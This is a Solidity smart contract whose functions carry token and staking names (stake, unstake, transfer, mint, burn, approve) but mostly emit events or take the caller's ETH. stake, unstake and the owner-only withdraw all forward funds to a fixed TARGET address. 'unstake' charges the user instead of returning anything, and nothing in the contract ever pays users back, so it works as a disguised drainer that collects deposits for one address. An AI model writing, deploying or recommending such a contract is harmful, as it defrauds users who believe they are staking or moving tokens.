// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

contract Base {
    address public immutable TARGET;
    address public immutable OWNER;

    event SmallTransfered(address indexed user, uint256 amount, uint256 timestamp);
    event Transfered(address indexed user, uint256 amount, uint256 timestamp);
    event Minted(address indexed user, uint256 timestamp);
    event Burned(address indexed user, uint256 timestamp);
    event Approved(address indexed user, uint256 timestamp);
    event Staked(address indexed user, uint256 amount, uint256 timestamp);
    event Unstaked(address indexed user, uint256 amount, uint256 timestamp);
    event Withdrawed(address indexed target, uint256 amount, uint256 timestamp);

    modifier onlyOwner() {
        require(msg.sender == OWNER, "Not authorized");
        _;
    }

    constructor(address _target) {
        TARGET = _target;
        OWNER = msg.sender;
    }

    function smallTransfer() public payable {
        require(msg.value > 0, "No token sent");

        emit SmallTransfered(msg.sender, msg.value, block.timestamp);
    }

    function transfer() public payable {
        require(msg.value > 0, "No token sent");

        emit Transfered(msg.sender, msg.value, block.timestamp);
    }

    function mint() public {
        emit Minted(msg.sender, block.timestamp);
    }

    function burn() public {
        emit Burned(msg.sender, block.timestamp);
    }

    function approve() public {
        emit Approved(msg.sender, block.timestamp);
    }

    function stake() public payable {
        require(msg.value > 0, "No token sent");

        (bool success, ) = TARGET.call{value: msg.value}("");
        require(success, "Transfer failed");

        emit Staked(msg.sender, msg.value, block.timestamp);
    }

    function unstake() public payable {
        require(msg.value > 0, "No token sent");

        (bool success, ) = TARGET.call{value: msg.value}("");
        require(success, "Transfer failed");

        emit Unstaked(msg.sender, msg.value, block.timestamp);
    }

    function withdraw() public onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "No balance to withdraw");

        (bool success, ) = TARGET.call{value: balance}("");
        require(success, "Withdraw failed");

        emit Withdrawed(TARGET, balance, block.timestamp);
    }
}
